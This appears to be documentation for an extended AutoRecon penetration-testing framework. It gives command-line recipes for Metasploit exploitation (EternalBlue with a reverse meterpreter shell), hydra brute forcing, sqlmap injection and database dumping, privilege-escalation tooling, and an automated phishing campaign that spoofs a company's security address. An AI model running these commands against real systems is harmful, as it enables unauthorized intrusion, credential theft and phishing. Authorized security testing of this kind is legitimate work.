# AutoRecon Attack Capabilities

This document describes the attack capabilities that have been added to AutoRecon, transforming it from a reconnaissance tool into a comprehensive penetration testing framework.

## ⚠️ IMPORTANT WARNING

**These attack capabilities are for authorized testing only. Only use on systems you own or have explicit permission to test. Unauthorized use of these tools may be illegal and could result in criminal charges.**

## Overview

The enhanced AutoRecon includes four new plugin types that extend beyond reconnaissance:

1. **ExploitScan** - Vulnerability exploitation plugins
2. **AttackScan** - Active attack capabilities  
3. **PostExploit** - Post-exploitation activities
4. **EmailScan** - Email-based attacks

## Enabling Attack Mode

Attack capabilities must be explicitly enabled:

```bash
# Enable attack mode (shows warnings)
autorecon --enable-attack-mode <target>

# List available attack plugins
autorecon --enable-attack-mode --list attack
autorecon --enable-attack-mode --list exploit
autorecon --enable-attack-mode --list postexploit
autorecon --enable-attack-mode --list email
```

## Attack Plugin Types

### ExploitScan Plugins

These plugins perform vulnerability exploitation using frameworks like Metasploit.

**Available Plugins:**
- `metasploit-exploit` - Automated Metasploit exploitation
- `exploitdb-search` - Search and download exploits from Exploit Database

**Example Usage:**
```bash
# Metasploit exploitation
autorecon --enable-attack-mode \
  --exploit-scans metasploit-exploit \
  --metasploit-exploit.module exploit/windows/smb/ms17_010_eternalblue \
  --metasploit-exploit.lhost 192.168.1.10 \
  --metasploit-exploit.payload windows/meterpreter/reverse_tcp \
  192.168.1.100

# Exploit database search
autorecon --enable-attack-mode \
  --exploit-scans exploitdb-search \
  --exploitdb-search.download-exploits \
  192.168.1.100
```

### AttackScan Plugins

These plugins perform active attacks against services and applications.

**Available Plugins:**
- `enhanced-brute-force` - Multi-protocol brute forcing
- `sqlmap-attack` - SQL injection testing
- `web-crawler-attack` - Web application testing
- `attack-surface-analysis` - Attack surface analysis

**Example Usage:**
```bash
# Enhanced brute force attack
autorecon --enable-attack-mode \
  --attack-scans enhanced-brute-force \
  --enhanced-brute-force.tool hydra \
  --enhanced-brute-force.threads 16 \
  192.168.1.100

# SQL injection testing
autorecon --enable-attack-mode \
  --attack-scans sqlmap-attack \
  --sqlmap-attack.level 3 \
  --sqlmap-attack.risk 2 \
  --sqlmap-attack.batch \
  192.168.1.100

# Web application testing
autorecon --enable-attack-mode \
  --attack-scans web-crawler-attack \
  --web-crawler-attack.max-depth 3 \
  --web-crawler-attack.test-forms \
  --web-crawler-attack.parameter-fuzzing \
  192.168.1.100
```

### PostExploit Plugins

These plugins perform post-exploitation activities after gaining access.

**Available Plugins:**
- `privilege-escalation` - Automated privilege escalation enumeration

**Example Usage:**
```bash
# Privilege escalation enumeration
autorecon --enable-attack-mode \
  --postexploit-scans privilege-escalation \
  --privilege-escalation.target-os linux \
  --privilege-escalation.download-tools \
  --privilege-escalation.kernel-exploits \
  192.168.1.100
```

### EmailScan Plugins

These plugins perform email-based attacks for social engineering.

**Available Plugins:**
- `phishing-campaign` - Automated phishing email campaigns

**Example Usage:**
```bash
# Phishing campaign
autorecon --enable-attack-mode \
  --email-scans phishing-campaign \
  --phishing-campaign.smtp-server smtp.example.com \
  --phishing-campaign.smtp-username attacker@example.com \
  --phishing-campaign.smtp-password password123 \
  --phishing-campaign.from-email security@targetcompany.com \
  --phishing-campaign.target-emails /path/to/emails.txt \
  --phishing-campaign.template /path/to/template.html \
  192.168.1.100
```

## Plugin Configuration Options

### Enhanced Brute Force (`enhanced-brute-force`)

| Option | Default | Description |
|--------|---------|-------------|
| `tool` | hydra | Tool to use (hydra, medusa, ncrack, crowbar, patator) |
| `username-list` | - | Custom username wordlist |
| `password-list` | - | Custom password wordlist |
| `threads` | 16 | Number of parallel connections |
| `empty-passwords` | false | Try empty passwords |
| `username-as-password` | false | Try username as password |

### SQLMap Attack (`sqlmap-attack`)

| Option | Default | Description |
|--------|---------|-------------|
| `url` | auto-detect | Target URL to test |
| `level` | 1 | Test level (1-5) |
| `risk` | 1 | Test risk (1-3) |
| `batch` | false | Non-interactive mode |
| `forms` | false | Test forms |
| `crawl` | false | Crawl website |
| `dump` | false | Dump database entries |

### Metasploit Exploit (`metasploit-exploit`)

| Option | Default | Description |
|--------|---------|-------------|
| `module` | - | Metasploit module to use |
| `payload` | windows/meterpreter/reverse_tcp | Payload |
| `lhost` | - | Local host for reverse connections |
| `lport` | 4444 | Local port for reverse connections |
| `auto-handler` | false | Start multi/handler automatically |

### Web Crawler Attack (`web-crawler-attack`)

| Option | Default | Description |
|--------|---------|-------------|
| `max-depth` | 3 | Maximum crawl depth |
| `max-pages` | 100 | Maximum pages to crawl |
| `test-forms` | false | Test discovered forms |
| `brute-dirs` | false | Brute force directories |
| `parameter-fuzzing` | false | Fuzz parameters |

## Safety Features

1. **Explicit Enablement**: Attack mode must be explicitly enabled with `--enable-attack-mode`
2. **Warning Messages**: Clear warnings displayed when attack mode is enabled
3. **Risk Assessment**: All plugins have assigned risk levels
4. **Confirmation Required**: High-risk plugins require confirmation
5. **Separated Plugins**: Attack plugins are separate from reconnaissance plugins
6. **Comprehensive Logging**: All activities are logged for audit purposes

## Output Structure

Attack results are organized in an enhanced directory structure:

```
results/<target>/
├── exploit/                    # Exploit code and payloads
├── loot/                      # Extracted data and credentials  
├── report/                    # Attack reports and summaries
│   ├── attack_timeline.txt    # Chronological attack log
│   ├── credentials.txt        # Found credentials
│   └── recommendations.txt    # Security recommendations
└── scans/
    ├── attack_surface_analysis/  # Attack surface analysis
    ├── exploits/                 # Exploit search results
    ├── privilege_escalation/     # Post-exploitation results
    ├── web_attacks/             # Web attack results
    └── brute_force/             # Brute force results
```

## Tool Dependencies

The attack plugins integrate with various penetration testing tools:

### Required Tools
- `hydra` - Password brute forcing
- `sqlmap` - SQL injection testing
- `nmap` - Network scanning
- `curl` - HTTP requests

### Optional Tools
- `metasploit-framework` - Exploitation framework
- `medusa` - Alternative brute forcer
- `ncrack` - Network authentication cracker
- `gobuster` - Directory/file brute forcer
- `searchsploit` - Exploit database search

### Installation on Kali Linux
```bash
sudo apt update
sudo apt install hydra sqlmap metasploit-framework medusa ncrack gobuster exploitdb
```

## Example Workflows

### 1. Basic Attack Chain
```bash
# Step 1: Reconnaissance (existing functionality)
autorecon 192.168.1.100

# Step 2: Attack surface analysis
autorecon --enable-attack-mode \
  --attack-scans attack-surface-analysis \
  192.168.1.100

# Step 3: Targeted attacks based on findings
autorecon --enable-attack-mode \
  --attack-scans enhanced-brute-force,sqlmap-attack \
  192.168.1.100
```

### 2. Web Application Testing
```bash
# Comprehensive web application assessment
autorecon --enable-attack-mode \
  --attack-scans web-crawler-attack,sqlmap-attack \
  --web-crawler-attack.test-forms \
  --web-crawler-attack.parameter-fuzzing \
  --sqlmap-attack.forms \
  --sqlmap-attack.crawl \
  --sqlmap-attack.level 3 \
  webapp.example.com
```

### 3. Network Penetration Testing
```bash
# Network-focused attack chain
autorecon --enable-attack-mode \
  --attack-scans enhanced-brute-force \
  --exploit-scans metasploit-exploit,exploitdb-search \
  --enhanced-brute-force.tool hydra \
  --exploitdb-search.download-exploits \
  192.168.1.0/24
```

## Best Practices

1. **Start with Reconnaissance**: Always run standard reconnaissance first
2. **Gradual Escalation**: Begin with low-risk attacks before high-risk ones
3. **Authorization**: Ensure you have explicit permission for all testing
4. **Documentation**: Keep detailed logs of all activities
5. **Responsible Disclosure**: Report findings through proper channels
6. **Legal Compliance**: Understand and comply with all applicable laws

## Troubleshooting

### Common Issues

1. **Tool Not Found Errors**
   ```bash
   # Install missing tools
   sudo apt install <missing-tool>
   
   # Or specify custom paths
   autorecon --enable-attack-mode --sqlmap-attack.path /custom/path/sqlmap
   ```

2. **Permission Errors**
   ```bash
   # Some tools may require elevated privileges
   sudo autorecon --enable-attack-mode <target>
   ```

3. **Plugin Loading Issues**
   ```bash
   # Check plugin syntax
   python3 -m py_compile autorecon/attack-plugins/<plugin>.py
   ```

### Debug Mode
```bash
# Enable verbose output for debugging
autorecon --enable-attack-mode -vvv <target>
```

## Contributing

To add new attack plugins:

1. Create a new plugin file in `autorecon/attack-plugins/`
2. Inherit from appropriate base class (`ExploitScan`, `AttackScan`, `PostExploit`, or `EmailScan`)
3. Implement required methods (`configure`, `run`, `manual`)
4. Add appropriate risk levels and safety checks
5. Include comprehensive documentation and examples

## Legal Disclaimer

These tools are provided for educational and authorized testing purposes only. The authors and contributors are not responsible for any misuse or damage caused by these tools. Users must ensure they have proper authorization before testing any systems and must comply with all applicable laws and regulations.

Always remember: **With great power comes great responsibility.**